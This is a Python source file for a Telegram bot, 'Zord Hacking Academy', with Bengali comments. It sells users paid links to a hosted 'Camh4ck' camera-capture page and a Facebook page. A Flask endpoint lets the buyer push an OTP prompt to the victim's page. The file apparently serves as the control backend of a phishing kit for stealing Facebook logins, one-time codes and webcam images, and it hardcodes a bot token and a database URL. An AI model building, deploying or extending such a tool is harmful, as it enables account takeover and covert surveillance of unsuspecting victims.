import telebot
from telebot import types
import requests
import time
from flask import Flask, jsonify
from flask_cors import CORS
from threading import Thread
import os
import random
import string

# --- সেটিংস ---
BOT_TOKEN = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs"
ADMIN_ID = 7068444019
ADMIN_USERNAME = "bcdatp10" 
CHANNEL_ID = "@hackingacademyX"
FIREBASE_URL = "https://bot-user-deta-default-rtdb.asia-southeast1.firebasedatabase.app/"
BASE_URL = "https://myw4371-a11y.github.io/Camh4ck/"

bot = telebot.TeleBot(BOT_TOKEN)
user_commands = {} 
temp_admin_data = {} # অ্যাডমিন ইনপুটের জন্য

# --- রেন্ডার ও CORS সার্ভার ---
app = Flask('')
CORS(app)

@app.route('/')
def home(): return "Zord Hacking Bot is Online!"

@app.route('/get_command/<user_id>')
def get_command(user_id):
    status = user_commands.get(str(user_id), "loading")
    response = jsonify({"status": status})
    response.headers.add("Access-Control-Allow-Origin", "*")
    return response

def run(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
def keep_alive(): Thread(target=run).start()

# --- ডেটাবেস ফাংশন ---
def get_user(user_id):
    res = requests.get(f"{FIREBASE_URL}/users/{user_id}.json")
    return res.json() or {"coins": 0, "diamonds": 0, "referral_count": 0, "status": "active"}

def save_user(user_id, data):
    requests.patch(f"{FIREBASE_URL}/users/{user_id}.json", json=data)

def is_subscribed(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_ID, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

# --- মেনু ডিজাইন ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🚀 Start", "💰 My Assets")
    markup.row("👥 Refer", "🔥 Access")
    markup.row("ℹ️ Info")
    return markup

# --- স্টার্ট হ্যান্ডলার ---
@bot.message_handler(commands=['start'])
def welcome(message):
    user_id = str(message.chat.id)
    if not is_subscribed(user_id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("চ্যানেলে জয়েন করুন 📢", url=f"https://t.me/hackingacademyX"))
        markup.add(types.InlineKeyboardButton("জয়েন করেছি ✅", callback_data="verify_join"))
        bot.send_message(user_id, "⚠️ **অ্যাক্সেস ডিনাইড!**\nবোটটি ব্যবহার করতে আগে চ্যানেলে জয়েন করুন।", reply_markup=markup)
        return
    bot.send_message(user_id, "📡 **সিস্টেম অনলাইন...**\nZord Hacking Academy-তে স্বাগতম।", reply_markup=main_menu())

# --- টেক্সট মেসেজ ও মেনু লজিক ---
@bot.message_handler(func=lambda m: True)
def handle_text(message):
    user_id = str(message.chat.id)
    if not is_subscribed(user_id): return

    text = message.text
    data = get_user(user_id)

    if text == "🚀 Start":
        bot.send_message(user_id, "🚀 কমান্ড গ্রহণ করার জন্য বোটটি প্রস্তুত।", reply_markup=main_menu())

    elif text == "💰 My Assets":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🛒 প্রিমিয়াম পারচেজ", url=f"https://t.me/{ADMIN_USERNAME}"),
                   types.InlineKeyboardButton("🎁 রিডিম কোড দিন", callback_data="redeem_ui"))
        
        # শুধুমাত্র অ্যাডমিনের জন্য জেনারেট বাটন
        if message.chat.id == ADMIN_ID:
            markup.add(types.InlineKeyboardButton("⚙️ Generate Redeem Code", callback_data="admin_gen_start"))
            
        bot.send_message(user_id, f"📊 **অ্যাকাউন্ট স্ট্যাটাস:**\n\n🪙 Coins: `{data.get('coins', 0)}` \n💎 Diamonds: `{data.get('diamonds', 0)}`", reply_markup=markup, parse_mode='Markdown')

    elif text == "👥 Refer":
        bot_user = bot.get_me().username
        link = f"https://t.me/{bot_user}?start={user_id}"
        bot.send_message(user_id, f"👥 **রেফারাল প্রোগ্রাম:**\n\nলিঙ্ক: `{link}`", parse_mode='Markdown')

    elif text == "🔥 Access":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📸 ক্যামেরা (10 Coin)", callback_data="buy_cam"),
                   types.InlineKeyboardButton("🔐 ফেসবুক (5 Diamond)", callback_data="buy_fb"))
        bot.send_message(user_id, "🛠 **টুলস মেনু:**", reply_markup=markup)

    elif text == "ℹ️ Info":
        bot.send_message(user_id, "🏛 **Zord Hacking Academy**\n━━━━━━━━━━━━━━━━━━━━\n⚠️ সতর্কবার্তা: অপব্যবহারের জন্য ব্যবহারকারী দায়ী।")

# --- কলব্যাক হ্যান্ডলার ---
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = str(call.message.chat.id)
    data = get_user(user_id)

    # অ্যাডমিন রিডিম কোড জেনারেশন ফ্লো
    if call.data == "admin_gen_start":
        if int(user_id) != ADMIN_ID: return
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🪙 Coins", callback_data="set_type_coins"),
                   types.InlineKeyboardButton("💎 Diamonds", callback_data="set_type_diamonds"))
        bot.send_message(ADMIN_ID, "🛠 **জেনারেটর:**\nকোডটি কিসের জন্য বানাবেন?", reply_markup=markup)

    elif call.data.startswith("set_type_"):
        ctype = call.data.split("_")[2]
        temp_admin_data[ADMIN_ID] = {"type": ctype}
        msg = bot.send_message(ADMIN_ID, f"✅ {ctype} সিলেক্ট করেছেন।\nকত অ্যামাউন্ট দিতে চান? (শুধু সংখ্যা লিখুন):")
        bot.register_next_step_handler(msg, admin_amount_step)

    elif call.data == "redeem_ui":
        msg = bot.send_message(user_id, "📩 আপনার রিডিম কোডটি এখানে লিখুন:")
        bot.register_next_step_handler(msg, process_redeem_user)

    # বাকি সব অরিজিনাল লজিক (ক্যামেরা, ফেসবুক, ওটিপি) ঠিক রাখা হয়েছে
    elif call.data == "buy_cam":
        if data.get('coins', 0) >= 10:
            data['coins'] -= 10
            save_user(user_id, data)
            link = f"{BASE_URL}?id={user_id}&exp={int(time.time())+3600}"
            bot.send_message(user_id, f"✅ ক্যামেরা লিঙ্ক: `{link}`")
        else: bot.answer_callback_query(call.id, "❌ যথেষ্ট কয়েন নেই!", show_alert=True)

    elif call.data == "buy_fb":
        if data.get('diamonds', 0) >= 5:
            data['diamonds'] -= 5
            save_user(user_id, data)
            user_commands[user_id] = "loading"
            link = f"{BASE_URL}fb/?id={user_id}&exp={int(time.time())+3600}"
            bot.send_message(user_id, f"✅ ফেসবুক লিঙ্ক: `{link}`")
        else: bot.answer_callback_query(call.id, "❌ ডায়মন্ড নেই!", show_alert=True)

    elif call.data.startswith("open_otp_"):
        target_id = call.data.split("_")[2]
        user_commands[str(target_id)] = "show_otp"
        bot.answer_callback_query(call.id, "✅ ওটিপি পেজ পাঠানো হয়েছে!")

    elif call.data == "verify_join":
        if is_subscribed(user_id):
            bot.delete_message(user_id, call.message.message_id)
            bot.send_message(user_id, "✅ ভেরিফিকেশন সফল!", reply_markup=main_menu())
        else: bot.answer_callback_query(call.id, "❌ আগে জয়েন করুন!", show_alert=True)

# --- অ্যাডমিন প্রসেস ফাংশন ---
def admin_amount_step(message):
    if not message.text.isdigit():
        msg = bot.send_message(ADMIN_ID, "❌ শুধু সংখ্যা লিখুন:")
        bot.register_next_step_handler(msg, admin_amount_step)
        return
    temp_admin_data[ADMIN_ID]["amount"] = int(message.text)
    msg = bot.send_message(ADMIN_ID, "✅ এখন লিখুন কতজন ইউজার এটি ব্যবহার করতে পারবে? (সংখ্যা দিন):")
    bot.register_next_step_handler(msg, admin_limit_step)

def admin_limit_step(message):
    if not message.text.isdigit():
        msg = bot.send_message(ADMIN_ID, "❌ শুধু সংখ্যা লিখুন:")
        bot.register_next_step_handler(msg, admin_limit_step)
        return
    
    limit = int(message.text)
    atype = temp_admin_data[ADMIN_ID]["type"]
    amount = temp_admin_data[ADMIN_ID]["amount"]
    code = "ZORD-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    
    promo_data = {"type": atype, "amount": amount, "limit": limit, "used_count": 0, "used_by": {}}
    requests.put(f"{FIREBASE_URL}/promo_codes/{code}.json", json=promo_data)
    
    bot.send_message(ADMIN_ID, f"🎉 **কোড তৈরি হয়েছে!**\n\n🎫 কোড: `{code}`\n💰 কিসের জন্য: {atype}\n💵 পরিমাণ: {amount}\n👥 সীমা: {limit} জন", parse_mode='Markdown')

# --- ইউজার রিডিম প্রসেস ---
def process_redeem_user(message):
    user_id = str(message.chat.id)
    code_in = message.text.strip()
    res = requests.get(f"{FIREBASE_URL}/promo_codes/{code_in}.json").json()

    if res:
        if user_id in res.get("used_by", {}):
            bot.send_message(user_id, "❌ আপনি এটি একবার ব্যবহার করেছেন!")
            return
        if res["used_count"] >= res["limit"]:
            bot.send_message(user_id, "❌ এই কোডের ব্যবহারের সীমা শেষ!")
            return
        
        udata = get_user(user_id)
        udata[res["type"]] += res["amount"]
        save_user(user_id, udata)
        
        res["used_count"] += 1
        if "used_by" not in res: res["used_by"] = {}
        res["used_by"][user_id] = True
        requests.put(f"{FIREBASE_URL}/promo_codes/{code_in}.json", json=res)
        
        bot.send_message(user_id, f"🎉 আপনি {res['amount']} {res['type']} পেয়েছেন!")
    else: bot.send_message(user_id, "❌ ভুল কোড!")

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling()
